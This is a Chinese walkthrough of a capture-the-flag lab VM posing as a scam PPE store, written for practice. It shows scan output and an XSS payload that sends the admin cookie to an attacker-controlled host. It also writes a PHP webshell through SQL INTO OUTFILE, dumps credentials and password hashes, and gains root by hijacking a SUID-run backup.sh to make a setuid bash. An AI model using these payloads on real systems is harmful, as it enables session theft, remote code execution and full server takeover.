# 靶机信息
骗子正在利用人们，各种假购物网站被建立起来，但人们发现他们的订单根本没送到。我们发现了一个诈骗网站，认为它正在从受害者那里收集信用卡信息。你的目标是通过获取 root 权限来关闭诈骗网站，并识别他们服务器上的三个标记。我们的情报显示，骗子正在积极审查所有订单，以快速利用信用卡信息。

# 信息收集
## Nmap扫描
```
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:0a:3a:42:5f:92:47:69:33:59:b3:77:53:3c:be:73 (RSA)
|   256 ab:3d:26:3b:d9:02:50:a4:49:c0:bf:13:75:dc:a5:73 (ECDSA)
|_  256 fb:6a:7e:1b:05:f9:d1:ef:be:dd:ff:39:ed:f5:f5:63 (ED25519)
80/tcp   open     http         Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Your PPE Supplier
445/tcp  filtered microsoft-ds
9090/tcp closed   zeus-admin
MAC Address: 00:0C:29:CA:21:8D (VMware)
Aggressive OS guesses: Linux 5.1 - 5.15 (98%), Linux 3.10 - 4.11 (96%), Linux 3.2 - 4.14 (94%), Linux 3.16 - 4.6 (94%), OpenWrt 19.07 (Linux 4.14) (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 - 5.14 (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (93%), Linux 2.6.39 (93%), Linux 3.13 - 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 21 04:51:13 2026 -- 1 IP address (1 host up) scanned in 21.32 seconds
```
重点就是排查80端口了。

## web信息枚举
主页是电商平台，扫一下目录
```
[20:50:04] 301 -  238B  - /_admin  ->  http://192.168.218.241/_admin/                                                                            
[20:50:04] 200 -    1KB - /_admin/                                                                                                               
[20:50:16] 403 -  217B  - /cgi-bin/                                                                                                              
[20:50:17] 301 -  237B  - /class  ->  http://192.168.218.241/class/                                                                              
[20:50:17] 404 -   16B  - /composer.phar                                                                                                         
[20:50:19] 301 -  235B  - /css  ->  http://192.168.218.241/css/                                                                                  
                                    
[20:50:48] 200 -    1KB - /gulpfile.js
[20:51:04] 301 -  235B  - /img  ->  http://192.168.218.241/img/
[20:51:04] 404 -   16B  - /index.php/login/
[20:51:07] 200 -    1KB - /LICENSE
[20:51:17] 200 -    1KB - /package.json
[20:51:17] 200 -  194KB - /package-lock.json
[20:51:17] 404 -   16B  - /php-cs-fixer.phar
[20:51:19] 404 -   16B  - /phpunit.phar
[20:51:22] 200 -    4KB - /README.md 
[20:51:25] 301 -  240B  - /settings  ->  http://192.168.218.241/settings/
[20:51:25] 200 -  890B  - /settings/ 
[20:51:34] 200 -    1KB - /vendor/
```
```
/css                  (Status: 301) [Size: 235] [--> http://192.168.218.241/css/]
/img                  (Status: 301) [Size: 235] [--> http://192.168.218.241/img/]
/class                (Status: 301) [Size: 237] [--> http://192.168.218.241/class/]
/index.html           (Status: 200) [Size: 5822]
/_admin               (Status: 301) [Size: 238] [--> http://192.168.218.241/_admin/]
/settings             (Status: 301) [Size: 240] [--> http://192.168.218.241/settings/]
/noindex              (Status: 301) [Size: 239] [--> http://192.168.218.241/noindex/]
/vendor               (Status: 301) [Size: 238] [--> http://192.168.218.241/vendor/]
/buynow.php           (Status: 200) [Size: 7164]
/index.html           (Status: 200) [Size: 5822]
Progress: 224656 / 224660 (100.00%)
```

信息比较多，挨个看看，发现都没什么用，存在一个订单提交页面 buynow.php 以及 /_admin/dist/ 跳转的登录页面，有很tpl文件，AI分析说可能是SSTI漏洞，加上sql注入都试了一下，都没用，然后卡了很久，没招了，问了一下红笔，加上这个靶机的简介，感觉就是订单提交的xss漏洞，结合页面带有session，应该是利用xss弹回来高权限的cookie登录。试试

<img width="1691" height="369" alt="Image" src="https://github.com/user-attachments/assets/75b483e8-c029-49cf-9df8-868645963b22" />

在订单表格直接全部写上`<script>location.href='[http://192.168.218.128:80/?c='+document.cookie](http://192.168.218.128/?c=%27+document.cookie);</script>`

<img width="1910" height="879" alt="Image" src="https://github.com/user-attachments/assets/9acb7e71-b729-4ba5-9e00-005d02fb4e1c" />

kali上打开http监听，成功接受到请求，并附带cookie

<img width="1919" height="375" alt="Image" src="https://github.com/user-attachments/assets/5a4a97ae-6e01-4327-b698-b87bcc6b7d5a" />

更改浏览器的cookie，刷新 /_admin/dist/login.php 页面

<img width="1916" height="424" alt="Image" src="https://github.com/user-attachments/assets/e9b92ecd-1146-46c6-b277-596908250776" />

成功登录骗子网站后台

<img width="1919" height="851" alt="Image" src="https://github.com/user-attachments/assets/f94ddb4b-faf8-46b0-9c5e-122b00ef6e17" />

看到有一个 sql管理工具，不知道权限如何，尝试写入webshell 命令`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'`

访问一下，成功了。弹shell回来。

<img width="1919" height="401" alt="Image" src="https://github.com/user-attachments/assets/352f9b1c-a5c3-4e7c-834f-ac13836240cd" />

# 横向移动
拿到apache身份，考虑到目标的sql情况，加上 /setting/config.php，怀疑会有敏感数据，看一下
```
cat /var/www/html/settings/config.php
<?php

$databaseUsername = 'orders';
$databasePassword = 'Ob2UA15ubBtzpZrvdMYT';
$databaseServer = 'localhost';
$databaseName = 'orders';

?>
```
连接一下，成功连上数据库。
```
MariaDB [orders]> show tables;
show tables;
+------------------+
| Tables_in_orders |
+------------------+
| orders           |
| users            |
+------------------+
2 rows in set (0.000 sec)

MariaDB [orders]> select * from users;
select * from users;
+--------+--------------+--------------------------------------------------------------+
| userID | userName     | password                                                     |
+--------+--------------+--------------------------------------------------------------+
|      1 | admin        | $2y$12$A4jqwtWB73.TAMIeplx0T.5oG/mnHR1qTDa8cmtTIvW3ZTjdSjdjC |
|      2 | m0n3y6r4bb3r | $2y$12$EX/FDsztTMwftzPRyY8gFuM7ZjAphQRZs88qpZpmboRogOAOYXowC |
+--------+--------------+--------------------------------------------------------------+
2 rows in set (0.001 sec)

cat /etc/passwd | grep home
moneygrabber:x:1000:1000::/home/moneygrabber:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```
找到了两个用户，刚好对应系统的两个用户，使用john爆破一下，我没有爆破出来，直接找的 密码是 **delta1**

# 提权
这里用户目录有一个明显的文件backup.sh，很异常，这个文件肯定有问题，文件内容很简单，就是将mysql目录打包很简单，好像没办法利用，AI直接跟我笃定是定时任务，让我直接劫持了，反正没影响试一试，将这个backup文件删了，主机写一个反弹shell的sh文件。然后等一等，结果根本没有动静。

那就再看看有没有别的发现，执行`find / -perm -4000 2>/dev/null`
有个输出比较显眼 **/usr/bin/backup**
这是linux不存在的默认命令，感觉他跟家目录的backup文件有关系
使用了一下发现卡住了，由于我之前已经把backup改了，但是，我又没有收到shell，利用strings看一下程序。

<img width="1919" height="630" alt="Image" src="https://github.com/user-attachments/assets/3238dd67-f3ec-4d80-b054-170b6fe2ffe8" />

发现存在 **/home/moneygrabber/backup.sh** 字符串，感觉这个 SUID 程序的作用就是以 Root 身份去执行家目录下的那个脚本！

尝试写提权脚本
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```
制作一个带s位的bash

然后执行 `/usr/bin/backup`再执行`/tmp/rootbash -p` 保留s位打开一个shell

<img width="1919" height="593" alt="Image" src="https://github.com/user-attachments/assets/483c3ff6-6d65-4b6a-b70e-332cc8c46922" />

OK提权成功。

# 反思
靶机稍难，大多了不带交互的靶机，遇到需要交互的靶机后卡了这么久，没想到是xss拿的shell，没有提示我指定完蛋，包括横向提权的找到密码简单，爆破我也没有爆破出来，太慢了，不知道有没有什么好办法，可以快速爆破出来。然后就是最后的提权，劫持文件，我第一反应就是root的文件，我好像删不了，并且发现这个文件之后，也是一直执着于这个文件很久，各种问AI也没办法提权，才开始找其他的遗漏。靶机非常不错，很考验玩家思路。